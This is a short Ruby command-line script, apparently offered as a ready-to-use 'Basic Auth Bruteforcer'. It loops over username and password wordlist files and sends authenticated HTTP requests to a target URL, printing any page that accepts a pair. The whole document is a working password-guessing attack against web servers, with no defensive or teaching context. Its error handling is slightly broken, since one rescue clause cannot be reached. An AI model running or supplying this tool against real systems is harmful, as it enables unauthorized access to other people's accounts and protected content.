#!/bin/ruby
require 'net/http'
require 'timeout'

print ("

Basic Auth Bruteforcer
----------------------------
Usage: #{File.basename($0)} url uri 


")
if ARGV.length < 2
    $stderr.puts("Usage: #{File.basename($0)}  ")
    exit
end

url = "#{ARGV[0]}"
p url
uri = "#{ARGV[1]}"
p uri
username = IO.readlines("user.txt")
password = IO.readlines("password.txt")
resp = href = "";
begin
http = Net::HTTP.new(url, 80)
   #http.use_ssl = true
 username.each do |user|
  password.each do |pass|
  p "trying  #{user.chomp} with password #{pass.chomp}"
   Timeout::timeout(3) do
   http.start do |http|
   req = Net::HTTP::Get.new(uri, {"User-Agent" => "wget"})
   req.basic_auth(user.chomp, pass.chomp)
   response = http.request(req)
    case response
     when Net::HTTPOK
      p resp = response.body
     when Net::HTTPUnauthorized
      p 'Unauthorized'
     else 
      p 'error'
    end
   end
   end
  end
 end
 rescue
  $stderr.print "Connection Failed: " + $! + "\n"
 rescue Timeout::Error
  p "Problem Connecting"

end
